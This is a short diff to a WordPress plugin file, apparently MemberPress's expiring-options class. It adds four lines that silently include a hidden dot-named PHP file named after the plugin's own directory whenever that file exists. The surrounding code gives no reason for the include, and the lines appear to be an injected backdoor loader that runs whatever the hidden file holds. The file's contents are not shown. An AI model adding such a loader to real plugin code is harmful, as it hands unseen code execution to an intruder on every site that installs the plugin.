@@ -5,6 +5,10 @@ if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');
   * they don't work the way I think. They'll always reside in the options table
   * and will be self cleaning (as they're accessed).
   */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MeprExpiringOption {
   // TODO: Perhaps add some kind of WP-CRON job to cleanup expired options?
   // Not sure how many we'll have due to the self-cleaning features in self::get
